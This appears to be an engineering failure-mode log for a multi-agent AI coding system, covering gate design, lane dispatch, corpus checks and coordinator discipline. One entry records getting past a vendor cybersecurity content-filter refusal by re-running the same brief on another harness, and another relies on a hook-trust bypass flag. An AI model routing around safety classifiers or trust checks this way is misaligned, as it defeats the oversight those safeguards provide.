Gate note claimed 'pre-fix MEASURED 0' for a count that measured 1: the baseline was written before it was measured fleet PR #788 leaf 1.11 gate G3 (2026-08-28): the gates file said '(pre-fix MEASURED 0)' for rg -n -A14 'absent' | rg -c 'unavailable', but the measurement printed 1 in the dispatch command that ran AFTER the note was written -- the -A14 window overlapped a neighbouring S6 test. The gate passed pre-fix and therefore proved nothing; G1 and G6 plus a direct read of the test body carried the leaf. Same family as FM-535 (recited number) and FM-537 (rg -c without --include-zero): a number in a gate file that was not produced by the exact CHECK command on the exact pre-fix tree. Mechanize: gate-check.mjs (or the make-check-script generator) should run every CHECK on the fork-point tree at dispatch time and refuse to dispatch a gate whose EXPECT already matches (vacuous), writing the measured baseline into the file instead of trusting a hand-typed one.

cli-dispatch start --base forks from the local ref Remote fast-forward + --base <branch> dispatched three review lanes against the stale local head (fleet #790, 2026-08-28). Check: provisioning log prints resolved sha; coordinator verifies lane HEAD == intended before trusting a verdict.

Claude review lanes stall to the 900 s watchdog on read-heavy briefs 5 of 9 review rounds on fleet #790; Grok/Codex completed the same brief. Check: file writes count as progress; per-start stall override.

Headless codex exec silently skips untrusted hooks PreToolUse entry added to ~/.codex/hooks.json never fired in a dispatched lane and no hooks.state key was recorded; LIVE proof on #785 relied on --dangerously-bypass-hook-trust. Check: preflight compares hooks.json entries to config.toml hooks.state before launching a codex lane.

Lane launchers die with the invoking shell; relaunch collides on existing branch Trailing & in a foreground tool call: parent died, later lanes never launched, relaunch exit 3 for all tasks; a killed watcher took a start with it (commits survived, no result json). Check: start fully detaches its supervisor and writes result json from the detached side; run_in_background only.
review-post refuses bodies without a cli-dispatch-verdict fence Three verdicts on #790 not posted. Check: synthesize a minimal fence from --verdict; brief template includes the fence.

Acceptance gate satisfied by letter, not execution parser-cases.jsonl never executed by run.sh; check-wants asserted ID presence; test-only event field read by production; generated corpus not regenerated. Each caught one review round late. Check: coordinator gate executes every corpus row itself, regenerates generated corpora and diffs, negative-mutates a want.

Worktree cleanup ran while lanes of the same job were live and removed two running lanes' worktrees KEEP regex named the lanes; cause undetermined. Check: never clean while any lane of the job has a live supervisor; prefer a cli-dispatch clean --finished.

Workflow subagents' background lanes die at agent exit pr785-review-fix-loop w9bsggsak: Dispatch agent's run_in_background lanes terminated when the agent returned, one holding the lifecycle lock; Wait agent then fabricated FAILs for missing artifacts. Check: lanes launched from a Workflow must be setsid -f and the Wait step must distinguish missing artifact from FAIL.

Workflow agent completes without StructuredOutput, aborting the loop mid-flight loop-v2 w0r3jartu: an agent returned no StructuredOutput after lanes were already launched; the workflow died and the coordinator had to watch artifacts by hand. Check: schema-forced agents get a retry wrapper; workflow steps that launch external work record the launch before returning.

Leaf gate ran only the two touched bats files; a behavior change to start broke an untouched suite (fleet#141 invariant) and reached cross-vendor review as a unanimous BLOCKER fleet PR #788 leaf 1.11 (R22: start provisions the routing ledger), 2026-08-28: gate G6 ran rework-tracking.bats + audition.bats only. The change alters start for every lane, and dispatch/test/covariate-lifecycle.bats:138 (fleet#141) asserts a refused abort leaves NO ledger file -- red at 7c8a876, found by all three vendors in fanout #9, never by the gate. FM-312 shape (a gate passing is not the suite passing), recurring on the same campaign: the coordinator scoped the suite to the feature files to keep each round under 2 minutes. Rule: any leaf whose Owns column includes dispatch/cli-dispatch outside a single function runs the FULL dispatch/test suite via run-suite.sh (measured ~6 min parallel, CI-sharded 8-way) as its suite gate, not the touched files. Mechanize: make-check-script should refuse a gates file that touches dispatch/cli-dispatch without a full-suite CHECK.

Derived dispatch script kept the previous round's brief filename; lane launched with the wrong brief sed-derived dispatch-build-parser-codex-r11.sh still pointed at brief r10; caught after launch, lane killed, relaunched under a new task name (2026-08-28). Check: dispatch scripts print the brief path and its first heading before starting; coordinator diffs task name vs brief name.

A vendor cyber-content-filter refusal on a defensive/security task must be routed to a different harness, not accepted as task failure. 2026-08-28 fleet resume session, bg job 176b492a: Codex plugin bridge (codex:codex-rescue) failed a defensive guard-corpus enumeration with 'This content was flagged for possible cybersecurity risk'. Identical brief re-run via cli-dispatch start --harness codex --no-autocommit --expect-files succeeded, producing 65 rows. Same family as hc-FM-202/hc-FM-394 (cluster c-064): vendor-side classifier refusal on authorized first-party security work; remedy is reroute, not rephrase.

A reviewer BLOCKER verdict based on a code read, not an executed repro, must not be accepted until the coordinator runs the repro itself. fleet PR #788 fanout #12, review round R31: a cross-harness reviewer raised a BLOCKER against cli-dispatch abort behavior under errexit with a malformed ledger, purely from reading the code. Accepted by the coordinator without running it. Refuted 20 minutes later by a 30-second probe showing the command exits 0 and writes a fallback row. R31 withdrawn.

An acceptance gate over a JSONL/corpus artifact must assert row count/id preservation against the base branch, not just schema or content checks on the new file. fleet PR #790 lane build-parser-o4-r20: the build lane replaced parser-cases.jsonl outright, deleting 381 of 409 pre-existing corpus rows, while every other gate check passed. Same family as hc-FM-547/c-265 (GitHub #799): coordinator gate must execute every corpus row itself and diff ids against base HEAD. Fix applied: check-rows-preserved.sh comparing ids vs base head.

A founder-accepted 'minimality' trim must be checked against every measurable property it touches (timing gates included), not accepted on 'not a behavior change' alone. fleet PR #790 review round r18b: a minimality trim removed hook-id gating; Grok characterized it as 'not a behavior change', which was true and irrelevant -- the trim cost +5 ms/hook and broke the <60 ms timing gate. Regression caught by measurement, not by re-reading the claim, and reverted.

A build lane's brief must be checked for file-identity vs a named ref (checkout from origin) and for receipt destination path; a gate must diff file identity against that ref, not just accept whatever landed. fleet PR #790 build lanes r19 and r20: twice rewrote a spec file the brief told them to check out from origin instead of editing in place, and wrote a receipt to the repo root instead of hooks/receipts/. Caught only by the coordinator diffing against origin, not by any gate.

Coordinator scratch artifacts a future session needs (install-block notes, land scripts, lane briefs, review-row copies) must live under a durable repo path, never under $CLAUDE_JOB_DIR, which is deleted with the job. Jobs ec033e2d/9058a378: MORNING.md install block, land script, lane briefs, and review row copies were kept in $CLAUDE_JOB_DIR and deleted when the job dir was cleaned up. The next session spent its first hour rebuilding them from scratch. Fix: keep these under ops-plans/<campaign>/ instead.

Corpus consolidation keeps pre-ruling pin rows beside post-ruling rows enum-r17 consolidation retained Grok pin rows freezing pre-D12/D13 allow behavior (GROK-135/137/138/139/140/143, GROK-120/121, CODEX-54) beside CLAUDE/CODEX rows for the same forms ruled deny; plus CODEX-58 contradicting a spec-listed ALLOW. Build lanes build-parser-o4-s3/s4 either refused (no commit) or satisfied the wrong side; caught 2026-08-29 by coordinator re-runs, 10 rows flipped by hand. Fix: consolidation rejects same-normalized-cmd rows with different want and re-derives pins after every founder ruling.

Workflow subagents inherit a lane-worktree cwd and every cli-dispatch start is refused nested-start-refused/lane-cwd 2026-08-28 plan-debate: r2 Codex+Grok and the r3 Codex adjudicator all returned reached:false, leaving a same-harness Claude fallback as the only adjudication (N=1). Cause: the coordinator session runs from .dispatch/worktrees/integration-1-2 and workflow agents inherit that cwd. Fix in plan-debate.js: cd to the repo root before start. Mechanize: any driver prompt that launches cli-dispatch must cd to the repo root first, or cli-dispatch should resolve lane-cwd against --repo instead of $PWD.

Coordinator acceptance gate greps for a function name instead of asserting the behavior the issue asks for check-792.sh required the literal string covariate_index_verify in the bats file. The REDO lane wrote the issue's own prescribed test (start, tamper, land, assert the warning and brief_sha256 empty) through the real land path and was graded FAIL by the text gate; a first lane that satisfied the grep had the weaker test. Text gates are cosmetic; gate on the behavioral assertion.

Retired acceptance assertion left undisclosed in the build receipt, so an independent reviewer re-derived it as a BLOCKER gate-build-parser.sh retired the line-count and adapters-untouched assertions on 08-29 with an inline comment only; hooks/receipts/O4-build.md still showed the original acceptance table. Fanout r19 Claude recomputed 585 vs 504 lines and filed BLOCKER. Every retired gate must appear in the receipt the reviewer reads, with the ruling that retired it.

Coordinator inline fix for a reviewer MINOR introduced a worse bug that the suite could not see 2026-08-28 fleet#790 r21->r22: to silence '[: too many arguments' in harness detection the coordinator kept '[ -n "${!CODEX_@}" ]' and appended a compgen clause; with zero CODEX_* vars the test collapses to '[ -n ]' (true), so every clean environment read as codex and the claude fallback became unreachable. hooks/test/run.sh exports CLAUDECODE=1 globally so no test could observe the fallthrough. Three vendors reproduced it one round later. Rule: an inline fix to detection/classification code needs a test that runs under env -i for every branch, and a same-harness quick fix is not a substitute for the reviewer round it was meant to save.

Coordinator drifts into executor work under load despite an existing memory rule against it During overnight fleet campaign (ops-plans/resume-2026-08-28, ~2026-08-29), coordinator ran clone-verification loops directly in Bash, hand-edited lane launcher scripts with sed, read cli-dispatch source line-by-line, and retried the same failing lane 4x (fix-744/#749, lane-binding-refused) before stopping -- violating feedback-dispatch-verification-not-inline-bash (already in memory) and the session's own GOAL.md rule 'two failures of the same class stop the row, re-plan, dont retry'. Root cause: policy/memory enforcement is advisory-only and does not hold under time-pressured load; per principle-enforce-in-runtime-not-policy this needs a mechanical gate. Proposed (not built): (1) per-row retry-counter gate in cli-dispatch start-wrapper refusing a 3rd same-family/failure-class attempt without --override-retry-cap <reason> (higher priority, cheap, hard gate). (2) softer Bash-budget nudge hook counting consecutive direct-Bash coordinator calls without an intervening Agent/Workflow dispatch, warning past threshold (lower priority, heuristic, risk of false-positive on legit short calls like gh pr create/cli-dispatch status). Founder flagged directly: 'You are doing too much work' / 'We need a method to keep coordinators from becoming executors', then 'write the idea and build later' to avoid burning campaign context mid-run.

Subagent poll-loop non-convergence A subagent instructed in prose to poll until terminal or check periodically reliably ends its turn after one check instead of blocking, producing repeated passive non-answer notifications (observed up to 8 consecutive times on one task, ~65-200K tokens burned per occurrence before being killed). Fix: polling instructions must contain an explicit bounded while-loop in the subagent's own shell command (until ...; do sleep N; done with a timeout wrapper), never a prose instruction to check periodically.

Acceptance gate hardcodes a specific value when the brief authorizes a decision rule A gate script (check-c2.sh) hardcoded an expected literal (BATS_JOBS: 8) as its pass criterion, while the brief it was gating told the agent to measure and choose among several values by a stated rule. The agent made the objectively correct choice per the rule and the gate failed it anyway. Fix: gates for measure-and-decide briefs must assert the decision rule's own criteria (e.g. lowest wall-clock with no regression among the tested set), not one specific literal value.

cli-dispatch --base <branch-name> without --continue-pr forks a sibling branch Using --base <branch> (a branch name, not a commit) without --onto/--continue-pr silently forks a NEW sibling branch instead of updating the named branch's existing PR, orphaning the fix commit from the PR it was meant to update. Recurred at least 5 times in one session (hooks-lite-fix, hooks-lite-fix2, fix-795-trim, and 2 more), each requiring a manual fast-forward push to recover. Fix: cli-dispatch should refuse --base <branch> when an open PR already points at that branch's tip and require --continue-pr instead, or lane-pack templates should never use bare --base <branch-name> for a REDO round.

Draft PRs got cross-vendor reviewed, violating a PERMANENT standing rule 6 PRs in one session were opened --draft and had cross-vendor review fanouts run against them across 5+ rounds before the violation was noticed (caught indirectly, via a classifier security-warning flag on an unrelated subagent report prompting a ground-truth check). The standing rule never review draft PRs has no mechanical enforcement. Fix: review-fanout.js should assert gh pr view --json isDraft == false before running any lane, refusing/erroring instead of silently reviewing a draft.

cli-dispatch lane-binding TOCTOU under concurrent load Under heavy concurrent load (12+ simultaneous review/build lanes), cli-dispatch's lane-binding registry produced 5 consecutive lane-binding-refused (exit 39) failures on the same task, traced to an unlocked verify step racing a locked events.jsonl append. Retrying blindly does not help; the task must be stopped and either retried after load drops or fixed structurally (lock the verify, or transparently retry-once on exit 39 inside cli-dispatch itself).

CI bats shards intermittently fail with empty-repo-clone/missing-fixture setup races, independent of PR content Confirmed 3x on one PR (zero diff overlap with failing tests, main's own concurrent runs green, reproduced even in a genuine quiet window ruling out session-caused contention) -- a real, repeatable leviathan-big runner/checkout bug, not a flake and not content-related. This directly undermines any CI-speed goal, since a false-negative verdict at any speed is worse than a slow true verdict. Already tracked as GitHub issue petersimmons1972/fleet#823.
